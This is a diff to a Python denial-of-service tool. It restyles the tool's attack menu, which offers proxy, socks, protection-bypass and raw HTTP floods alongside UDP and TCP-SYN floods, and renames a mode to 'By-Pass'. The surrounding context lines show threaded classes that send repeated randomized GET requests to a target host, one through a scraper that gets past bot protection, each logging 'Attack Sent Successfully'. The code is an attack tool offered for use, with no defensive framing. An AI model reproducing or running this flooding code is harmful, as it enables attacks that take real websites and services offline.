@@ -320,13 +320,13 @@ def proxyget():
 def start_mode():
     global choice_mode, filenam1, filenam2, method_pass_cf
     print("""
-[+]=====[ Layer 7 ]=====[+]=======[ Layer 4 ]=======[+]
- # 0: Home      [ HOME ] # 5: UDP Flood     [ Home ] #
- # 1: Proxy     [ DDoS ] # 6: TCP-SYN Flood [ DDos ] #
- # 2: Socks     [ DDoS ] #                           #
- # 3: JS-Normal [ Home ] #                           #
- # 4: Raw-DoS   [ Home ] #                           #
-[+]=================================================[+]
+[+]_____[ Layer 7 ]______[+]_______[ Layer 4 ]________[+]
+ | 0 : Home      [ HOME ] | 5 : UDP Flood     [ Home ] |
+ | 1 : Proxy     [ DDoS ] | 6 : TCP-SYN Flood [ DDos ] |
+ | 2 : Socks     [ DDoS ] |                            |
+ | 3 : By-Pass   [ Home ] |                            |
+ | 4 : Raw-DoS   [ Home ] |                            |
+[+]___________________________________________________[+]
 """)
     choice_mode = input("[*] Attack Mode [0-6] : ")
     if choice_mode == "0":
@@ -347,8 +347,8 @@ def start_mode():
         choice_down_proxies()
     elif choice_mode == "3":
         print(" ")
-        print("root@root:~# 1: Method ByPass v1")
-        print("root@root:~# 2: Method ByPass v2")
+        print("root@root:~# 1 : Method ByPass v1")
+        print("root@root:~# 2 : Method ByPass v2")
         filenam2 = "JS-Bypass"
         method_pass_cf = input("[?] Method [1/2] : ")
         if (method_pass_cf == "") or (method_pass_cf == "1"):
@@ -423,8 +423,8 @@ def choice_down_proxies():
     choice4 = input("[?] Get New List " +str(filenam2)+ " [Y/N]: ")
     if (choice4 == "y") or (choice4 == "Y"):
         print(" ")
-        print("root@root:~# 1: Server X")
-        print("root@root:~# 2: Server Z")
+        print("root@root:~# 1 : Server X")
+        print("root@root:~# 2 : Server Z")
         sel_pr = input("[?] Server Get [1/2]: ")
         if choice_mode == "proxy":
             if sel_pr == "1":
@@ -787,7 +787,7 @@ class JSv1(threading.Thread):
                     http.request("GET", url, headers=headersx)
                 else:
                     http.request("GET /?=" +str(random.randint(0,20000)), headers=headersx)
-                print("[+] Attack Sent Successfully | JS-Normal ✓ " +str(random.randint(0, 1000))+ " => " +str(host_url))
+                print("[+] Attack Sent Successfully | By-Pass ✓ " +str(random.randint(0, 1000))+ " => " +str(host_url))
                 try:
                     for y in range(multiple):
                         http.request("GET", url,headers=headersx)
@@ -819,7 +819,7 @@ class JSv2(threading.Thread):
                     soso = scraper.get(url, timeout=15)
                 else:
                     soso = scraper.get(url+ "?=" +str(random.randint(0,20000)), timeout=15)
-                print("[+] Attack Sent Successfully | JS-Normal ✓ " +str(random.randint(0, 1000))+ " => " +str(host_url))
+                print("[+] Attack Sent Successfully | By-Pass ✓ " +str(random.randint(0, 1000))+ " => " +str(host_url))
                 #req_code += 1
                 try:
                     for y in range(multiple):
